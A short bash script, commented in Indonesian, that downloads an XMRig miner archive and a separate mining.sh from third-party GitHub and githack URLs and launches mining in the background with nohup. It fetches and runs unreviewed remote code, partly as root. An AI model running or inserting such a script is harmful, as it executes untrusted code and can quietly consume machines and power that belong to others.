#!/bin/bash

# Update & install screen
sudo apt update && sudo apt install -y screen

# Download dan ekstrak XMRig
sudo curl -L -o xmrig.tar.gz "https://raw.githubusercontent.com/appjobdesk/note/main/xmrig.tar.gz" 
tar -xvzf xmrig.tar.gz && cd xmrig

# Beri izin eksekusi ke xmrig
chmod +x ./xmrig

# Download skrip mining
sudo curl -L -o mining.sh "https://raw.githack.com/appjobdesk/eknote/main/mining.sh"

# Ubah kepemilikan agar bisa dieksekusi oleh user saat ini
sudo chown $(whoami):$(whoami) mining.sh

# Beri izin eksekusi ke mining.sh
chmod +x mining.sh

# Jalankan mining di background
nohup ./mining.sh > mining.log 2>&1 &
